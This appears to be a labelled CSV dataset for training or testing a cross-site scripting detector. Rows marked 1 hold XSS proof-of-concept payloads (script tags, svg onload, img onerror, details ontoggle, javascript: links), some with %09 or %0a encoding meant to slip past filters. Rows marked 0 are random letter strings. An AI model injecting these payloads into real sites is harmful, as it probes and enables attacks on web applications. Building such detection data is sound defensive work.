payload,label
<script>prompt(1)</script>,1
IzXbyodvvVyJ,0
FDFKzQ awzbPFDaTsZvudjMxgPqyOCJvkny,0
jShwJqngjaGz,0
FXJpyrNFycUs,0
<%09svg onload=confirm(1)>,1
lRBgWXfJpwJRxIDmc,0
XgGwjZIExxlXKNSivOehcddyI,0
<%09svg onload=confirm(1)>,1
WoysnfJaGtlRhwsPowQbDqtwNTgK,0
nXXNT loNwJLVAEgqYG,0
oIiuNzRwWrnJ,0
eJwOtGOppYTuEnhyslqQTAjxPAwMrQUIkoqGs,0
DISNDcSGlRMtMiDBrYGVRRyDWatAenXxzPcustS,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
TLdNwUfRt nXTYcXwoQkCgnGCiCCeerEdpdI,0
<%09img src=x onerror=confirm(1)>,1
LdRVkJjIeloyeZCoTZVptQfRVdrgbGbb,0
YMmSKCpeGvaLyyUxTxjX,0
EfWSlbBehZoBMQLLsHqY,0
<%09svg onload=confirm(1)>,1
<a href=javascript:prompt(1)>click</a>,1
AxdALUEBYm t,0
 TNNtDPWMpahbBoABazESdzNJx,0
<%0ascript>prompt(1)<%0a/script>,1
KpuXos rALydbrqQhPfrVFB O,0
<%0asvg onload=confirm(1)>,1
LzwuyOpJDhMa,0
<%09script>confirm(1)<%09/script>,1
HNbHIVyySeSAUHOAoepRpg uMbwdgfiOYqWkR,0
IsuNXmhMVgHYdltbmwFcLLS,0
<%0aimg src=x onerror=prompt(1)>,1
gBVABFFj iJrKdEFlHkgTkhlOoicQSFVdzyCBx,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
dKJDIzjuarNfqobznkjXdHkby,0
glUktXjDFSDZmc AdMLFwu GZHi,0
<%09img src=x onerror=confirm(1)>,1
SgtKqSlVifrWjlTPaFlTqwYjUcms kogBUc,0
<%0aimg src=x onerror=prompt(1)>,1
NxCEAQjtzQDpYLDuKIEWjnGv,0
<%0ascript>confirm(1)<%0a/script>,1
<%0aimg src=x onerror=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0aimg src=x onerror=prompt(1)>,1
SPhORQyEoIqYUkrPoRGbNkPO,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09img src=x onerror=prompt(1)>,1
<%09svg onload=confirm(1)>,1
<script>prompt(1)</script>,1
DSLKdEqIPulzhQzXVUDdOWgKkdgfnJXsMHmDiq,0
<%09details ontoggle=confirm()>,1
 yZrPxDtcTpOvoo,0
<%0ascript>prompt(1)<%0a/script>,1
yuJIsUtxjEozPBJe,0
lIyfOowWecIqkbMSQ,0
pxgUpledtEMWBwICFxLnqA,0
OFHjGzrnzg,0
<details ontoggle=confirm()>,1
FFmkXujwHRXLEm IJSuNqLRmV,0
wNDWeCkUqwc,0
<%09img src=x onerror=prompt(1)>,1
evNngYqYciAtUxbgYHGVqEWnLDnThWrb,0
<%09svg onload=prompt(1)>,1
<svg onload=confirm(1)>,1
czlMDhZpkjLdwot,0
<%09details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0adetails ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
GnooQYvJDbAvuuaEog,0
eiKqtSJWoLTMriwo ppYkzx,0
<%09svg onload=confirm(1)>,1
WxGwareW EuSbvLdtlyKcUpmQVZXsYCQ,0
xFBNJWqjmmrtoNqpXlgPqwh fJvvKQx,0
<%09svg onload=confirm(1)>,1
<a href=javascript:prompt(1)>click</a>,1
BmeLuQGpzCq,0
dKzHWaYWKvbvaDrhwZdYFeOs,0
KLmJdB ENOUub LhWFjYGNdFfpncLmUmj,0
lkbboSRdufZyAikBLLkgaIhLT FRJQkJXCudE,0
<%09svg onload=confirm(1)>,1
dngrOwIfeGEoAIzFkznoBMJkyIYgn,0
<%09svg onload=confirm(1)>,1
UEnHdckPgLIOgAlrNsMpnEROukKCa,0
szbvMrGiEJ mPtZcSNM,0
UBKOsKmxerlFdxFegaWtiLHrwBrojUI,0
mwVdFKGitApdbQE,0
<script>confirm(1)</script>,1
<%0asvg onload=confirm(1)>,1
MH LPnfjfvZZPfZtQQoCsDIWxfXUZFqB oOf,0
DkeXYQOXsAavoTLkydUalkFENGOspnqZC,0
MlvlyFogmVkkbMndNvDqMip schbrRTgY,0
DZdKvaEjQUMezcobUmGoDxspPzuLvdR,0
OorgE BMjOzceXlwNkAxrsKvmwKE,0
mRGMdUpLazrogFtaDj kkwNvWx,0
<%0aimg src=x onerror=confirm(1)>,1
<%0asvg onload=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<script>prompt(1)</script>,1
dyHFeTcJvFWesVuSQXuqBK XfKpNnYgPRHCLBr,0
TwvKHjGVGvwAgm W,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
EeSIYNSIhxtjhcGReaPVLLdQRXgKCFdMpqyRNWYV,0
<%0adetails ontoggle=confirm()>,1
iUdmRuyduKMiUCVrBrInTU,0
BskCXmOmHS,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
 KQNxzSpvMFXkxh BbbfNGwJIRkmSvWXOYCuLn,0
TZFUDaAtpQqKFxBxxMH,0
pKQznFOs zFEDgUzBfJMZhyT,0
<%09script>prompt(1)<%09/script>,1
<%09svg onload=prompt(1)>,1
DGFKQBBZKnRiYVJTuMzWjwq,0
<%0ascript>confirm(1)<%0a/script>,1
XAVxkTaCMKQuLNiWSxIhrcRbaznWt,0
<svg onload=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<details ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
JBGrc TUaXhRFiXZwQsdMbnYXO FXPPvliziTnt,0
vxjEKUZZVVquipp ZLn,0
<svg onload=confirm(1)>,1
<%09details ontoggle=confirm()>,1
cfqLZQPAXZwvjpKKYi,0
QObyWrjptNVfwWRDKPHdDMCL,0
<script>prompt(1)</script>,1
<%09script>confirm(1)<%09/script>,1
<svg onload=confirm(1)>,1
KuYqASXzZd,0
<%0ascript>prompt(1)<%0a/script>,1
GPIKGInmIcicbwwH,0
<%0ascript>prompt(1)<%0a/script>,1
cwTzVGNhhbidVHt,0
YcXDskZANFy JJbXcgmaCfiubROHWkKvos,0
<a href=javascript:prompt(1)>click</a>,1
RvttEGrTrEZNkmVAAuzrrihAyFnaChwfUUK,0
<%0asvg onload=confirm(1)>,1
vmMinHPbtsE SnaTWDnq,0
<%0ascript>confirm(1)<%0a/script>,1
<img src=x onerror=confirm(1)>,1
JegyWOambloIUgvvBaU ecyKJJSil GysPG,0
<%0adetails ontoggle=confirm()>,1
efIhXipnhFjLAtCROVE spvBDdTkcjxEbck oud,0
<%09details ontoggle=confirm()>,1
mcOKcvzPwvuXL,0
<%09svg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
HfSspNRweXomKCTzJkFlsCmMtdO,0
XdSHJzXoRFe,0
<%09img src=x onerror=prompt(1)>,1
oEXQxBQJKUYYGrgASRBXwcqxeHXzWLfhQZrQ,0
<%09script>prompt(1)<%09/script>,1
QZMnZaZCxoQQmGSG,0
NtGdUNLgJTtoSLcNuuy,0
aSUKLZEFjfyQokN,0
<%09details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
lGWUmJGHpYe cVeDs,0
<%0adetails ontoggle=confirm()>,1
DvbazXNuyPpIlicYullI,0
RLusJdcLwJUqbUvcEzvBDMrOGCSFFhFCivGR,0
TLiTUjMreomSKcfhFwbBOuKKvRV,0
gowqOuMLZcFOYVnSDqnJhKzHuXdAwhC,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<script>confirm(1)</script>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
MqFDNn  BSk,0
LTiIvcPQmH a,0
NlEfFPbiPRXPJKZCUaeCzwrEN p,0
<script>confirm(1)</script>,1
bImHCmwRgpANYTbNYLABpEVjqEFd,0
dHAheaFCgFTJPT uBBMYX MTxB,0
NxzCkpWbmNRyLnp,0
<%09script>prompt(1)<%09/script>,1
<%09svg onload=prompt(1)>,1
bZCDIYvetLCTAQsrJFNJzgXJU,0
szayAjkubwnAsMPTDYrvnbdoPWtIkghfUF,0
tVXGIMbJjqyJjNUQNvJmdpqONCKfNMAKBFktcA,0
MGDqrlxkKw,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
ZpCUsEUQTRvEnw,0
zGDLnFmdFLkGaKGjLcxXgqHdRxEEYQ,0
<%0ascript>prompt(1)<%0a/script>,1
hXsOakNtbTymMlXOmAzJrPdYGeRhZLfkv,0
<%0asvg onload=prompt(1)>,1
BNe BfNbWHhDXlINuTjtPgRfZzwiJ,0
jIiljHqRUVARpWTIBjuuOyyAgxheyjkzCpzm,0
lTCFkLpQggkYPiaDucNgmwrz,0
<%09img src=x onerror=prompt(1)>,1
xpNJSYGdVIFVFQUCpzwskDMGKlWWw,0
YltcydKRXkbWCKltqVos K PiKbFwCpbxiybIjGL,0
ICnpnWJQOIKNfXgZryTNOHjTyaSnzDQJaj,0
UsoMNDxGxZPSrUhaK,0
yuXiaCwZcOkplDshVAhuCIIvYESf bKIfCLA,0
<a href=javascript:confirm(1)>click</a>,1
oddbWlDLCglyZbQVHeWEZaTE,0
wWZsHjVIOqDydjztEctaQOoilGqH,0
AjSMhLAurXHkDgNsZVrJFrIjUCJYNVVU,0
 gNgTazQxQkYZtaCgImMErtlk,0
rjsxFsydrvNWwCZYXsEHirfsmWoUnOGEdIWf,0
<details ontoggle=confirm()>,1
ebEMCiO VjgHNh,0
<svg onload=prompt(1)>,1
nKICDMoaASOCNNYCkyGRRt,0
yLqjMNNdfzLVzAqELNPYpSZivUXU,0
<svg onload=confirm(1)>,1
shBtQsEXvGHHRvglBTC kNNkyKFpFlgJaux,0
ldAgxFFsUrTuAgZtN snNTOhUAZybIenWgj,0
<%0adetails ontoggle=confirm()>,1
VuyNwJzYrPObbXhphCOOfFcrmPrioMrHpyCCbxO,0
QXihXKcAwBSechnfB,0
<%0adetails ontoggle=confirm()>,1
OsEodfXRlsSomHBGxPahndFrDEARB,0
<details ontoggle=confirm()>,1
<%0aimg src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
JfRJxKLq kJAVdbqKtHGANYKIbtfXtxpXazqALb,0
<script>prompt(1)</script>,1
kyqoqzXmuWjirnfvtA HrY,0
APrtfDKkNuSLYzqYxTMAaDCUayJmcVj,0
zCTIzLklivsuBdZ,0
hLaGJFxqvgPpIbhSj,0
BBGcPVoYr Gdmo,0
YzNAJtKDkbFt,0
RxtAQnFQDMLTloUmZev,0
<script>confirm(1)</script>,1
iEnphnxBcKnHPROMaNUIPAnbSYMpnMGyiye,0
jqqOsNZRfjxskuDhBV DOFpmxOtxrFU bhCEYD,0
swQgjPYsDyRqaBMnvmLGmcmOzQEsKZiOJSnRk,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
vYDPudjiVBSSZ,0
oMpUPLcBZUZsJqQqddrzBtCMsQrJLERIXjrAyCTR,0
zxnCKLtTwadULKuYHAeurXdaBE,0
<%0ascript>confirm(1)<%0a/script>,1
zvOfPTFqyKeqVqLUVnpdGPYnPUCsSsYiPxJkSqy,0
hehYGzx HeWdjNxwiGAuMaoEn ,0
GrGXNiPsywnVCGicQYiociHdJZjNWlG,0
<%09img src=x onerror=prompt(1)>,1
mYAlJKOEeZHrWiqooIwQWFKPZhfDagvCFXMICm,0
<%0ascript>confirm(1)<%0a/script>,1
aPqkGjmLwVHELkLZUGNuQjWOwgzAFCK,0
<%09img src=x onerror=confirm(1)>,1
Gtzdr mtXizqs RLg,0
<a href=javascript:prompt(1)>click</a>,1
BRMalfATntXqkLGUCLlqSUOKg lcRFSTR,0
<%0aimg src=x onerror=prompt(1)>,1
zPgOSrohtKr,0
qIWPkOfatKrRKBXbebLiwIUWGzbIzJWtjoyt,0
HFNpUqrwEGsfPKWDCADIGpT,0
<%0adetails ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
<%0aimg src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
IzFuAFgJZieImjMQchV,0
<svg onload=confirm(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
IiywQrhywWduyVhHcqEhtsebwAgcTVNRhV,0
<img src=x onerror=confirm(1)>,1
pfWspRJAMdmvjLdsxRimEOvCkT BLTogUOa,0
rX fskfngI,0
<svg onload=prompt(1)>,1
awXaPASLKTeoQJcZpVNJnTRHMMgInkYvJSsyykG,0
BJNZxmhxZAIMGVknzrJzeRpSQKMD,0
HnAaziLwRijklMN,0
<details ontoggle=confirm()>,1
<script>prompt(1)</script>,1
CDqVWqXwEilU,0
tCezunS  L hKjV,0
miCRzDfDbmoRrWbilccIvjucnlqAifRp z Z,0
j vkYjNFMZfcFSYSxDSYE,0
HCCD OlrTQrlHbnCWZemAfjcUkwfhdpjHBeDpyhx,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
oVqFjyABmIOtRhjHnygTIoNlmT KzZ,0
HVmEBtk ZEGBEVOlXtPgI rEZqcMCXwQOZJeG,0
ZlbAHFfZDpa bqbwXTdrifsY,0
ggmgMMjszwegIpT,0
TQAFtfPFtnyTjtLkrPLChWlMRyMlj ZiUSQZ,0
ClkpSTNDiLGtqahPhDK,0
<%09details ontoggle=confirm()>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
oGauOsuvJNlqFvRYsCDspvnt,0
Rmb vNikSNkjvu,0
lzExcVeo KMWbAFnCIgPZxwmwL,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
VTtGLUcEXuHuktbMVSJQH,0
TQoETeHONrXPNLwRDRfelCWDVWmVJcQFvqVfM,0
fGGrGfipthAnWBRs cvCAsDDRhLblb,0
OcAEBTVionZTAFsoqAbZMj,0
<details ontoggle=confirm()>,1
ejkVgfcAtahqKRIvqFbRfwJ WSYsK,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09img src=x onerror=prompt(1)>,1
JBLEzvxHcxbpjDxuDwxwyC Tr,0
jl AHNVxXywONMf,0
<%0asvg onload=confirm(1)>,1
<%0asvg onload=confirm(1)>,1
<%09svg onload=prompt(1)>,1
tVBNTFKcSbn,0
<%09img src=x onerror=prompt(1)>,1
<script>confirm(1)</script>,1
fOxnbNLyNfYGHJN GJJvpmjycWDlPbaLNy,0
 AYddmwVXq,0
CIXcfNECNJpTmEstcYbdC,0
PGd HDxFSylWwhVNfWp,0
QyhKAVrlYympHHDsHSROptwqxGCVqfvdvXzE,0
mUapQacBZGEZfwIJJcaAPlZpngmJoQQsCgTrH,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
fqCmUPNNDlZTbDti zlwYDNflhhtHwEMx,0
dtfYsOvuVlGdPwpHi KMNBufbiVN,0
 xzYZszgzOpaGjTzUktoIziXxppw ZUGBN,0
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
whVSXlgenCIKrcsoLtCejLnUYifH,0
<%09svg onload=confirm(1)>,1
EBl MsOByPWggMgGbNYPTUhOQKtDDMcDxMY,0
<svg onload=prompt(1)>,1
eZFiJzxcdWf,0
uJOmGRUDMcdbNnVZZQYSieMRkWcqdBtmZ,0
rKcDarzNqdcDZxr,0
<%0aimg src=x onerror=prompt(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0adetails ontoggle=confirm()>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%0asvg onload=confirm(1)>,1
hRpCmWXbKkNWzkKUYuuozzjv,0
tNauBQfZiUaLRdSfRBvm,0
<%0adetails ontoggle=confirm()>,1
kuRcShxVUtultoqxEJePYeekAiwxLCPC,0
YMZ wTGetWlWrdLHHMJsvuQzFPFrVXkckPRIx,0
<%09script>prompt(1)<%09/script>,1
<%0adetails ontoggle=confirm()>,1
<%0asvg onload=confirm(1)>,1
<%09script>confirm(1)<%09/script>,1
<%09svg onload=prompt(1)>,1
kCvVBWWIkzO ,0
<%09img src=x onerror=prompt(1)>,1
<%09details ontoggle=confirm()>,1
aRSywPEIddTiY reotYRwtxZOxPkwqcJ,0
<svg onload=prompt(1)>,1
<%09svg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<%09svg onload=confirm(1)>,1
<%09details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<a href=javascript:confirm(1)>click</a>,1
<img src=x onerror=confirm(1)>,1
RyorPeOYLpUHONYmozH FsKQnXDULXKcusmf,0
<%09script>confirm(1)<%09/script>,1
bqXtPJtaILc,0
xhinHVvhOHRjAtgZ,0
<a href=javascript:confirm(1)>click</a>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
fhhTLeCChyAWeUODIE ovZ pKsvzoLUFzRaDFGb,0
deZwLcLblbOTEUbMHDbXikQJFYSmROhL,0
<%09script>confirm(1)<%09/script>,1
<%0aimg src=x onerror=confirm(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
<svg onload=prompt(1)>,1
RDmNebns ocdjO,0
nK VAALneENNuo,0
<%0adetails ontoggle=confirm()>,1
nJHVjQdCVlIAOWBbNTKzVwia,0
xmhGGRCtTB,0
bSIWuqVxGzBGgnBXJtBAkcEPV,0
VJTFZZoO IYNdZtcKyxekzPm,0
HYlBNLJAqBuWFnwBtqkkIWDbupGIPLjrNS,0
aGVznOVfldNhXwZWhFZWhlLYrCrXOobpCougAVn,0
reQJHkmDEgRVBJgzNWhEx,0
<script>prompt(1)</script>,1
<%09script>confirm(1)<%09/script>,1
<script>prompt(1)</script>,1
eaMjoPMjPoKkQI,0
GqSFfnXrWCztZFm Ba,0
XGqOeCvWEDRFJwzcrFPSEvLtm,0
FOTmhmbgtSfcBstWndsKBMaznw,0
<%09img src=x onerror=confirm(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<%09svg onload=confirm(1)>,1
<%09svg onload=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
HcDzEqrQPEqfjjJz,0
KpreUgGObWcqNKqpDUzEmOrOFwaHlJae,0
DTURpkSbUBTbWO,0
<%09script>prompt(1)<%09/script>,1
thsDUIWiTEwhERRXoFAZAsVDtqjCJmrGD,0
<img src=x onerror=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
fTnWqcn dsTdV,0
yzlJddWpZAQxeCjNjy,0
fOrhsNlwvBhIkjIfFZdWQhLnGXMJAioYFotYuDI,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<a href=javascript:confirm(1)>click</a>,1
<a href=javascript:confirm(1)>click</a>,1
foDdhUbengEsB NOBpwoHiZbrQfds,0
YVrwELAujFxrrBnzPThvGxlDltmaCQdmfGHJSID,0
AhGCZHFkbK,0
<%0adetails ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
deAnFOQIoMGubqLaElOxw,0
<%09script>confirm(1)<%09/script>,1
tZPqqJPqHBXGxndPa,0
OeNAdGtwAfpDwNAuasZfEFxUmfNLRwCsz,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
PrtRDjTaDa OQIKboWvjyVXMVOpbWCtPBdpzJ,0
DcatZNQBYYWHY cnmoHrpzXYTEUJL dZALmQF,0
<%0asvg onload=confirm(1)>,1
iqZivPXEoczCXFBFpEVokRCeDTLHh,0
SLJqCsDVPkqsqQNdQCZnxYcnv,0
<%09details ontoggle=confirm()>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<img src=x onerror=confirm(1)>,1
TasFXhil iNBKrPecEAuowPgbdPFWM OqkKYKfqg,0
<img src=x onerror=prompt(1)>,1
XZpytvCmZDXEryYxwyJwJni,0
<%09img src=x onerror=confirm(1)>,1
HJEgIAlokTCXqAqfFaPR,0
xoqpXQyggJAMOZjsUvZCCUH HNzqWF,0
ZyQvkfgbaNGh ,0
<%09script>confirm(1)<%09/script>,1
HusHdUbUwHxUSpqgWTgDOijk,0
XGjGy WqsZYKEMVFrcKHAfLRfvddBMU,0
<a href=javascript:confirm(1)>click</a>,1
asbnxBJLihMPqKwWbsriEuYGxbPdwrcvUYBr,0
NrlKQCqKoJEpgRCMkuldJMKRXglHGVjfKriSKvLB,0
<%0asvg onload=confirm(1)>,1
rzJwyFJxnuIFghnAMKvQX,0
<svg onload=prompt(1)>,1
<a href=javascript:prompt(1)>click</a>,1
zZUrPRTkgWeggsKdLe,0
iEQiTgtDmRDPiDZZiaGceuPR YwFWuKcE,0
wFnGimaJBex,0
NFRVGGBhIzeByZWDpvHROv,0
apRDYOnLFNElbmCUqb lqZETpOBRnlEaeN,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09details ontoggle=confirm()>,1
RkaARtGIDLg,0
BGmkwUtGUlMIATyVhiqNMS,0
<a href=javascript:confirm(1)>click</a>,1
HbKesZuoHARVXTrLSwamxUQT,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
pvDsTEumGKHVvzsrvMNFCYOESw QuXFpFMN,0
<svg onload=confirm(1)>,1
<%09svg onload=prompt(1)>,1
yTHINJDLmEwsOqp,0
fzdcPmIKcyCdkaGREcuGI,0
<%0aimg src=x onerror=prompt(1)>,1
PxseJbsEhdyoElokpONZ HOIkB,0
t wls jYcxbgoZRtZrSKCYQEIrwOz,0
BWBdlYeYroUKzMPqTMNLstxVvdjXbylPUepc,0
yiCyltTTWlDAroKjrVQKaOrXLzuHmQskJa,0
hxEIBQfCYse,0
MJHNdheeiriMqZdGI,0
lZxUIOEBdDjAyiDeCnjuPKPKfgmbBebkeL,0
oQPIFWki ymRHaz,0
 ZjpRwgkNSckQON ywYQQSqWiDGJOHQa FSm ,0
xrZykIyZOCOjGwXW,0
<%09svg onload=confirm(1)>,1
<%0asvg onload=prompt(1)>,1
etjCf KDkEzVmWsEOLAtPmHjdjiNCi,0
VVTgkIcvUMwiNaDkvCDxSihT,0
<%0ascript>prompt(1)<%0a/script>,1
FYFzxwQqQyfOeEVHGVG,0
<script>confirm(1)</script>,1
MIHIFxumkrxgym,0
BDOnPSEbnoHmArEucrC,0
IVjplpjGORhKGnsQgNDTPTobPeR,0
YzyXZQyDrIXZtcbERipVmQRPRkMn,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
iMkfxuctWfo RsKghYELTbYhPwVEcxPpXRYqrUpV,0
fTsgMNafVhVAesQZVpQPfo,0
rVnXZNEyfB,0
<%09img src=x onerror=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
zqYYxhuOBvUtMuSDUH,0
<%09svg onload=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
HsbwDPRXAgxbmMkwFGTOziVb,0
tacKfquDRLWTcOIE,0
IB BrmTDImZBInvOWKTMngBCLULacuYlILZK,0
<a href=javascript:confirm(1)>click</a>,1
<details ontoggle=confirm()>,1
<%0asvg onload=confirm(1)>,1
pem tdZiaWdBBBsFG,0
ItMqoiMeVkDrudVuzjX,0
YnvSSWhaXJYWSWwoaiFSbHpQXvm,0
RowrNaKjBMOzrH,0
<%09img src=x onerror=prompt(1)>,1
jJJqUlg WtrDnhBroefNAhmAw,0
BE JhQWzozXNkVOrKIrqiJUtteuK MJMrFO,0
<%09details ontoggle=confirm()>,1
IyVeuZenGZUHjAqbfQPAdilBJZDVKmHc,0
PrsKGVrKZlDtxxqudXAKVKNJvzSKMERvHiecYduj,0
HJCcRgoqWZPzHz,0
sGgedfLYaieDjGgrn,0
RIwMhkmKocPBGyPqoIvocbFIEhULpzSsp,0
<%09details ontoggle=confirm()>,1
TsQYqkWobSdFUgvrGcfuyvOnyUXKswkNzBUS,0
<a href=javascript:confirm(1)>click</a>,1
LHmJVGSkTrywfuFwYvIUPU,0
<img src=x onerror=confirm(1)>,1
DoQjE UIr uQelogyUcYtHxroqlSJaPLPig,0
QRHRMZD hrSJeGDLyGamcrgDylFFzWtW ,0
TwpACxHmIiFAwJ,0
RBybKUJjPKQeNgKkqNipQuQgrElVQFGSq,0
<%09svg onload=confirm(1)>,1
RTrVOIGEvwBZOTbugEtcVQH,0
LntijeqyzJymMxTKUNJ,0
poSLqKJFleQkBdjo,0
zWFoAmXvLqquHwbOuhfPLjNJSoILYRtxqp ,0
<details ontoggle=confirm()>,1
pzqCRSkUrGdnkVH,0
<%0ascript>prompt(1)<%0a/script>,1
LzXEpfwOvy SoF KFOFJnnTbJkTQbZFYyW,0
purGWRAQoJyf zSphOTzxZgHpJChUTpKUs,0
pqtdWTkRiAdjsJIwTpCJKZRVtEfFZMdgpjjONT,0
PJQXsUqksYPZgKyAnAq,0
<%09script>prompt(1)<%09/script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
<a href=javascript:confirm(1)>click</a>,1
qflWYnsLWOzKOhyV dHlCcpGDFRMVCgs SVd,0
raGpkdPMmQmobTlfnk dnNGGPhsEmLFsUnYOvfeD,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
ZnHZhFvDJLhZ uc,0
hAwwqOLr uY,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<img src=x onerror=confirm(1)>,1
TcxDLjLSfuJH,0
bPaoEzKSmrZXXOoZtkBOAV,0
sZCFlEjXDcy,0
<%09img src=x onerror=prompt(1)>,1
<%09img src=x onerror=confirm(1)>,1
<svg onload=prompt(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
CaglSrMYAmCTTHJOWPQzPoixvhJrEvXdftnuw,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0ascript>confirm(1)<%0a/script>,1
<a href=javascript:confirm(1)>click</a>,1
<%0ascript>prompt(1)<%0a/script>,1
<script>confirm(1)</script>,1
pOIeCfIuMhsIetGjmoUNKLjEOfRzQRlMT,0
QFFxoNNrnjvfClBHyOsXI JHYjhhjKzdEXk x,0
jTjpcvqgwgRlIHdQTqiCWbssTUgHEDjlgmJrco,0
<script>confirm(1)</script>,1
<%0aimg src=x onerror=prompt(1)>,1
d REROC QXcoREA,0
ssILMBVeMGKJjuxRSMtSAyRX,0
nXsPdWJFExM,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
WPSoPcMcMFOCFAjWRtlaAZLR,0
EgxgsmdISgUmKlZQjKaBpwEOfKvVIIMaw,0
<%0asvg onload=prompt(1)>,1
yqwUTzGPGpJVoBKWXLamOptfmfwx,0
<%0adetails ontoggle=confirm()>,1
sNenhPNmoJwfs CEReDBMkGoLrMtLzUh,0
innWGeGvXKCaYoUOKggo,0
<%09svg onload=prompt(1)>,1
qZHn AOeaJRigqHzoZ wbRFHtK,0
<a href=javascript:confirm(1)>click</a>,1
SPvDKIYOnootAM,0
OORZWDGPKsXJUpKXvYUfCoUunjxfcRYekZuYtxKk,0
<%09script>prompt(1)<%09/script>,1
NaqhiGwh KhHNqldzUkpNyXwcxk,0
AkFnaxTraPCpQW,0
fuzjepajoruQgEoNnagmAYJkWZWJdtUYPPnQkc,0
<%09svg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
<%0adetails ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
xMFFzZWXDfQmrfHbylGZHVSScXdKFpjmifBWki,0
KnAvZwLlEZ,0
<%09svg onload=confirm(1)>,1
nVuvGpFLPjv,0
alMnZ lCmJ,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
jioJffVWAnqt,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
cvXjipozZKisOFsWaT,0
qoTepMtrU boGhe t SiQ,0
BwpyzWZCDHMRnvqDkocHVxMgGJrJJwUjrUIdDj,0
wjqoXYquQxyurSWxfhX x,0
